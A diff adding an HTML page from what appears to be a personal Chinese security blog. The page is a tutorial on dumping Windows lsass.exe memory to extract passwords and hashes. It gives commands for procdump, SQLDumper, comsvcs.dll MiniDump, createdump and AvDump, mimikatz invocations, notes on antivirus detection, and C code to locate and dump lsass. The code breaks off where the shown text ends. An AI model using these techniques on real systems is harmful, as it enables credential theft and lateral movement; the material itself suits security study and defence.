@@ -1,0 +1,589 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>windows-lsass转储 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="windows-lsass转储">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-20 12:46" pubdate>
+        2023年2月20日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      64
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windows-lsass转储</h1>
+            
+            <div class="markdown-body">
+              <h1 id="lsass转储学习"><a href="#lsass转储学习" class="headerlink" title="lsass转储学习"></a>lsass转储学习</h1><blockquote>
+<p>lsass.exe（Local Security Authority Subsystem Service进程空间中，存有着机器的域、本地用户名和密码等重要信息。如果获取本地高权限，用户便可以访问LSASS进程内存，从而可以导出内部数据（password），用于横向移动和权限提升。通过lsass转储用户密码或者hash也算是渗透过程中必不可少的一步，这里学习一下原理以及记录下多种转储方法。</p>
+</blockquote>
+<p>@[toc]</p>
+<h2 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h2><h3 id="mimikatz-logonpasswords"><a href="#mimikatz-logonpasswords" class="headerlink" title="mimikatz::logonpasswords"></a>mimikatz::logonpasswords</h3><blockquote>
+<p>我们通常将这些工具称为LOLBins，指攻击者可以使用这些二进制文件执行超出其原始目的的操作。 我们关注LOLBins中导出内存的程序。</p>
+</blockquote>
+<h2 id="白名单工具"><a href="#白名单工具" class="headerlink" title="白名单工具"></a>白名单工具</h2><p>三个微软签名的白名单程序</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Procdump</span>.</span></span>exe<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SQLDumper</span>.</span></span>exe<br>createdump.exe<br></code></pre></div></td></tr></table></figure>
+<h3 id="Procdump转储Lsass-exe的内存"><a href="#Procdump转储Lsass-exe的内存" class="headerlink" title="Procdump转储Lsass.exe的内存"></a>Procdump转储Lsass.exe的内存</h3><p>ProcDump是微软签名的合法二进制文件，被提供用于转储进程内存。可以在微软文档中下载官方给出的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump文件</a></p>
+<p>用Procdump 抓取lsass进程dmp文件，</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass_dump<br></code></pre></div></td></tr></table></figure>
+<p>然后可以配置mimikatz使用</p>
+<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">sekurlsa::Minidump lsassdump.dmp<br>sekurlsa::logonPasswords<br></code></pre></div></td></tr></table></figure>
+<p>如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">procdump64.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> pid lsass_dum<br></code></pre></div></td></tr></table></figure>
+<p>这种原理是lsass.exe是Windows系统的安全机制，主要用于本地安全和登陆策略，通常在我们登陆系统时输入密码后，密码便会存贮在lsass.exe内存中，经过wdigest和tspkg两个模块调用后，对其使用可逆的算法进行加密并存储在内存中，而Mimikatz正是通过对lsass.exe逆算获取到明文密码。</p>
+<p>关于查杀情况，火绒病毒查杀并没有扫描到，360在13版本下也没检测到在14版本被查杀了。</p>
+<h3 id="SQLDumper-exe"><a href="#SQLDumper-exe" class="headerlink" title="SQLDumper.exe"></a>SQLDumper.exe</h3><p>Sqldumper.exe实用工具包含在 Microsoft SQL Server 中。 它生成用于调试目的SQL Server和相关进程的内存转储。<br><img src="https://img-blog.csdnimg.cn/img_convert/1d307e753437d92952fdbfdb6a18b4fc.png" srcset="/img/loading.gif" lazyload><br>sqldumper的常见路径如下</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\1</span>00<span class="hljs-symbol">\S</span>hared<span class="hljs-symbol">\S</span>qlDumper.exe<br><br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft Analysis Services<span class="hljs-symbol">\A</span>S OLEDB<span class="hljs-symbol">\1</span>0<span class="hljs-symbol">\S</span>QLDumper.exe<br><br>C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\1</span>00<span class="hljs-symbol">\S</span>hared<span class="hljs-symbol">\S</span>qlDumper.exe<br></code></pre></div></td></tr></table></figure>
+<p>SQLDumper.exe包含在Microsoft SQL和Office中，可生成完整转储文件。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tasklist</span> /svc | findstr lsass.exe  查看lsass.exe 的PID号<br><span class="hljs-attribute">Sqldumper</span>.exe ProcessID <span class="hljs-number">0</span> <span class="hljs-number">0</span>x<span class="hljs-number">01100</span>  导出mdmp文件<br></code></pre></div></td></tr></table></figure>
+<p>再本地解密即可需要使用相同版本操作系统。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure>
+<p>被360查杀，火绒没有检测<br><img src="https://img-blog.csdnimg.cn/img_convert/7076d94bffabecb346b9afabd610afb4.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="createdump-exe"><a href="#createdump-exe" class="headerlink" title="createdump.exe"></a>createdump.exe</h3><p>随着.NET5出现的，本身是个native binary.虽然有签名同样遭到AV查杀<br><img src="https://img-blog.csdnimg.cn/img_convert/b5e9ce0d1c711147a05c8a9025213285.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">createdump<span class="hljs-selector-class">.exe</span> -u -f lsass<span class="hljs-selector-class">.dmp</span> lsass<span class="hljs-selector-attr">[PID]</span><br></code></pre></div></td></tr></table></figure>
+<p>同样会被360查杀</p>
+<h3 id="comsvcs-dll"><a href="#comsvcs-dll" class="headerlink" title="comsvcs.dll"></a>comsvcs.dll</h3><p>comsvcs.dll主要是提供COM+ Services服务。每个Windows系统中都可以找到该文件，可以使用Rundll32执行其导出函数MiniDump实现进程的完全转储。</p>
+<p>该文件是一个白名单文件，我们主要是利用了Comsvsc.dll中的导出函数APIMiniDump来实现转储lsass.exe的目的，注意同样是需要管理员权限。因为需要开启SeDebugPrivilege权限。而在cmd中此权限是默认禁用的，powershell是默认启用的。<br><code>该文件位于C:\windows\system32\comsvcs.dll</code><br><img src="https://img-blog.csdnimg.cn/img_convert/bd52047c6452c49ef63e27d9169af7b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以这样使用如下方式来调用MiniDump实现转储lsass.exe进程:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">powershell C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\r</span>undll32.exe C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\c</span>omsvcs.dll, MiniDump (Get-Process lsass).id <span class="hljs-keyword">$env:TEMP\lsass-comsvcs.dmp full</span><br></code></pre></div></td></tr></table></figure>
+<p>360同样查杀,这种直接通过调用<code>APIMiniDump</code>来dump内存的行为还是太过敏感，不稍微修改很容易就被查杀。<br><img src="https://img-blog.csdnimg.cn/img_convert/939c1ba98a1149577c20f58fab979d4b.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="其它工具"><a href="#其它工具" class="headerlink" title="其它工具"></a>其它工具</h2><h3 id="rdleakdiag-exe"><a href="#rdleakdiag-exe" class="headerlink" title="rdleakdiag.exe"></a>rdleakdiag.exe</h3><p>默认存在的系统：</p>
+<p>Windows 10    Windows 8.1    Windows 8    Windows7    windows Vista<br>软件版本    10.0.15063.0    6.3.9600.17415    6.2.9200.16384    6.1.7600.16385    6.0.6001.18000<br>没有的情况可以选择传一个上去。<br><img src="https://img-blog.csdnimg.cn/img_convert/facfc9d777e6c4c02952fa874154de00.png" srcset="/img/loading.gif" lazyload><br>生成dmp内存文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rdrleakdiag.exe <span class="hljs-regexp">/p &lt;pid&gt; /</span>o &lt;outputdir&gt; <span class="hljs-regexp">/fullmemdmp /</span>wait <span class="hljs-number">1</span> Rst<br></code></pre></div></td></tr></table></figure>
+<p>会产生两个文件，results_+进程pid+.hlk，minidump_+进程pid+.dmp。然后同样使用mimikatz进行破解。</p>
+<h3 id="AvDump-exe"><a href="#AvDump-exe" class="headerlink" title="AvDump.exe"></a>AvDump.exe</h3><p>AvDump.exe是Avast杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。所以一般不会被av查杀。<br>下载地址：<a target="_blank" rel="noopener" href="https://www.pconlife.com/viewfileinfo/avdump64-exe/#fileinfoDownloadSaveInfodivGoto2">https://www.pconlife.com/viewfileinfo/avdump64-exe/#fileinfoDownloadSaveInfodivGoto2</a><br>需要在ps中调用，否则cmd默认是不开启seDEBUGPrivilege权限的，但是现在360会检测到avdump.</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-string">.</span><span class="hljs-comment">\AvDump</span><span class="hljs-string">.</span><span class="hljs-comment">exe</span> --<span class="hljs-comment">pid</span> &lt;<span class="hljs-comment">lsass</span> <span class="hljs-comment">pid</span>&gt; --<span class="hljs-comment">exception_ptr</span> <span class="hljs-comment">0</span> --<span class="hljs-comment">thread_id</span> <span class="hljs-comment">0</span> --<span class="hljs-comment">dump_level</span> <span class="hljs-comment">1</span> --<span class="hljs-comment">dump_file</span> <span class="hljs-comment">C:\Users\admin\Desktop\lsass</span><span class="hljs-string">.</span><span class="hljs-comment">dmp</span> --<span class="hljs-comment">min_interval</span> <span class="hljs-comment">0</span><br></code></pre></div></td></tr></table></figure>
+<p>但也是会被360查杀。</p>
+<h2 id="自主编写dll"><a href="#自主编写dll" class="headerlink" title="自主编写dll"></a>自主编写dll</h2><h3 id="调用APIMiniDump的一个demo"><a href="#调用APIMiniDump的一个demo" class="headerlink" title="调用APIMiniDump的一个demo"></a>调用APIMiniDump的一个demo</h3><p>这里涉及到windows进程编程，可以先看看如何遍历windows下的进程。遍历进程需要几个API和一个结构体。</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs plain">​ 1.创建进程快照<br>​ 2.初始化第一个要遍历的进程<br>​ 3.继续下次遍历<br>​ 4.进程信息结构体<br></code></pre></div></td></tr></table></figure>
+<p>创建进程使用<code>CreateToolhelp32Snapshot</code></p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateToolhelp32Snapshot</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">DWORD dwFlags, <span class="hljs-comment">//用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等</span></span></span><br><span class="hljs-function"><span class="hljs-params">DWORD th32ProcessID <span class="hljs-comment">//一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>获取第一个进程句柄使用<code>Process32First</code></p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL WINAPI <span class="hljs-title">Process32First</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    HANDLE hSnapshot,<span class="hljs-comment">//_in，进程快照句柄</span></span></span><br><span class="hljs-function"><span class="hljs-params">    LPPROCESSENTRY32 lppe<span class="hljs-comment">//_out，传入进程信息结构体,系统帮你填写.</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>获取下一个进程使用<code>Process32Next</code></p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL WINAPI <span class="hljs-title">Process32Next</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE hSnapshot,      　　从CreateToolhelp32Snapshot 返回的句柄</span></span><br><span class="hljs-function"><span class="hljs-params">  LPPROCESSENTRY32 lppe     指向PROCESSENTRY32结构的指针，进程信息结构体</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>其中还涉及到<code>PROCESSENTRY32</code>的结构体对我们有用的就是</p>
+<ul>
+<li>dwSize 初始化结构体的大小</li>
+<li>th32ProcessId 进程ID</li>
+<li>szExeFile[MAX_PATH] 进程路径<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tagPROCESSENTRY32</span> &#123;</span><br>    DWORD dwSize; <span class="hljs-comment">// 结构大小，首次调用之前必须初始化；</span><br>    DWORD cntUsage; <span class="hljs-comment">// 此进程的引用计数，为0时则进程结束；</span><br>    DWORD th32ProcessID; <span class="hljs-comment">// 进程ID;</span><br>    DWORD th32DefaultHeapID; <span class="hljs-comment">// 进程默认堆ID；</span><br>    DWORD th32ModuleID; <span class="hljs-comment">// 进程模块ID；</span><br>    DWORD cntThreads; <span class="hljs-comment">// 此进程开启的线程计数；</span><br>    DWORD th32ParentProcessID;<span class="hljs-comment">// 父进程ID；</span><br>    LONG pcPriClassBase; <span class="hljs-comment">// 线程优先权；</span><br>    DWORD dwFlags; <span class="hljs-comment">// 保留；</span><br>    <span class="hljs-keyword">char</span> szExeFile[MAX_PATH]; <span class="hljs-comment">// 进程全名；</span><br>&#125; PROCESSENTRY32;<br></code></pre></div></td></tr></table></figure>
+所以实现的代码就是<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">void get<span class="hljs-constructor">Process()</span> &#123;<br>    DWORD PID;<br>    HANDLE hProcessSnap;<br>    PROCESSENTRY32 process32;<br>    process32.dwSize = sizeof(process32);<br>    hProcessSnap = <span class="hljs-constructor">CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)</span>;<br>    <span class="hljs-keyword">if</span> (hProcessSnap<span class="hljs-operator"> == </span>INVALID_HANDLE_VALUE) &#123;<br>        printf(<span class="hljs-string">&quot;CreateToolhelp32Snapshot error!\n&quot;</span>);<br>    &#125;<br>    BOOL FirstProcess = <span class="hljs-constructor">Process32First(<span class="hljs-params">hProcessSnap</span>, &amp;<span class="hljs-params">process32</span>)</span>;<br>    <span class="hljs-keyword">while</span> (FirstProcess)<br>    &#123;<br>        BOOL NextProcess = <span class="hljs-constructor">Process32Next(<span class="hljs-params">hProcessSnap</span>, &amp;<span class="hljs-params">process32</span>)</span>;<br>        <span class="hljs-keyword">if</span> (NextProcess) &#123;<br>            printf(<span class="hljs-string">&quot;%ls----%d\n&quot;</span>, process32.szExeFile, process32.th32ProcessID);<br>            FirstProcess = <span class="hljs-constructor">Process32Next(<span class="hljs-params">hProcessSnap</span>, &amp;<span class="hljs-params">process32</span>)</span>;<br><br>        &#125;<br><br>    &#125;<br>    <span class="hljs-constructor">CloseHandle(<span class="hljs-params">hProcessSnap</span>)</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b04989aac1f22a7168a873ca0ea7962.png" srcset="/img/loading.gif" lazyload></p>
+<p>完整dump lsass进程内存的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;DbgHelp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment( lib, <span class="hljs-meta-string">&quot;Dbghelp.lib&quot;</span> )</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getProcess</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD PID;<br>    HANDLE hProcessSnap;<br>    PROCESSENTRY32 process32;<br>    process32.dwSize = <span class="hljs-keyword">sizeof</span>(process32);<br>    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateToolhelp32Snapshot error!\n&quot;</span>);<br>    &#125;<br>    BOOL FirstProcess = Process32First(hProcessSnap, &amp;process32);<br>    <span class="hljs-keyword">while</span> (FirstProcess)<br>    &#123;<br>        BOOL NextProcess = Process32Next(hProcessSnap, &amp;process32);<br>        <span class="hljs-keyword">if</span> (NextProcess) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ls----%d\n&quot;</span>, process32.szExeFile, process32.th32ProcessID);<br>            FirstProcess = Process32Next(hProcessSnap, &amp;process32);<br><br>        &#125;<br><br>    &#125;<br>    CloseHandle(hProcessSnap);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DWORD lsassPID = <span class="hljs-number">0</span>;<br>    HANDLE lsassHandle = <span class="hljs-literal">NULL</span>;<br>    HANDLE outFile = CreateFile(TEXT(<span class="hljs-string">&quot;lsass.dmp&quot;</span>), GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    PROCESSENTRY32 processEntry = &#123;&#125;;<br>    processEntry.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>    LPCWSTR processName = <span class="hljs-string">L&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (Process32First(snapshot, &amp;processEntry)) &#123;<br>        <span class="hljs-keyword">while</span> (_wcsicmp(processName, <span class="hljs-string">L&quot;lsass.exe&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            Process32Next(snapshot, &amp;processEntry);<br>            processName = processEntry.szExeFile;<br>            lsassPID = processEntry.th32ProcessID;<br>        &#125;<br>        wcout &lt;&lt; <span class="hljs-string">&quot;[+] Got lsass.exe PID: &quot;</span> &lt;&lt; lsassPID &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, lsassPID);<br> 